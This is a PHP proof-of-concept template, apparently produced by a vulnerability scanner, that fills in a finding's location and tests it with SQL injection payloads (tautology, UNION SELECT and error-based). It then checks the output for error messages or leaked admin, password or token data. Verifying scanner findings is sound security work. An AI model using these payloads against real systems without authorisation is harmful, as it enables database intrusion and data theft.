<?php
/**
 * PoC Template: SQL Injection
 * Auto-generated from ZeroKit finding
 * 
 * Vulnerability: {{CATEGORY}}
 * Location: {{FILE}}:{{LINE}}
 * 
 * This PoC attempts to exploit the SQL injection vulnerability
 * and verifies success via error messages or data extraction.
 */

// =====================================================
// SETUP
// =====================================================
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "====================================\n";
echo "🎯 PoC: SQL Injection\n";
echo "Location: {{FILE}}:{{LINE}}\n";
echo "====================================\n\n";

// =====================================================
// EXPLOIT PAYLOAD
// =====================================================
$payload = "' OR '1'='1' -- ";
$payload_union = "' UNION SELECT 1,2,3,4,5 -- ";
$payload_error = "' AND 1=CONVERT(int, (SELECT @@version)) -- ";

echo "[*] Testing payload: $payload\n";

// =====================================================
// VULNERABLE CODE EXECUTION
// =====================================================
// Template manager will replace this section with actual vulnerable code
$output = '';
ob_start();
// VULNERABLE_CODE_PLACEHOLDER
$output = ob_get_clean();

// =====================================================
// VERIFICATION
// =====================================================
$success = false;

// Check for SQL error messages (indicates injection worked)
if (preg_match('/SQL syntax|mysql_fetch|Warning.*mysql/i', $output)) {
    echo "✅ VULNERABILITY CONFIRMED: SQL error detected\n";
    $success = true;
}

// Check for unauthorized data access
if (preg_match('/admin|root|password|token/i', $output)) {
    echo "✅ VULNERABILITY CONFIRMED: Unauthorized data extracted\n";
    $success = true;
}

// Check for boolean-based injection success
if (strpos($output, 'true') !== false || strpos($output, '1=1') !== false) {
    echo "✅ VULNERABILITY CONFIRMED: Boolean-based injection successful\n";
    $success = true;
}

// =====================================================
// RESULT
// =====================================================
echo "\n====================================\n";
if ($success) {
    echo "🚨 RESULT: EXPLOITABLE\n";
    echo "Severity: {{SEVERITY}}\n";
    exit(0); // Success exit code for automation
} else {
    echo "❌ RESULT: NOT EXPLOITABLE\n";
    echo "False positive or sanitization present\n";
    exit(1); // Failure exit code
}
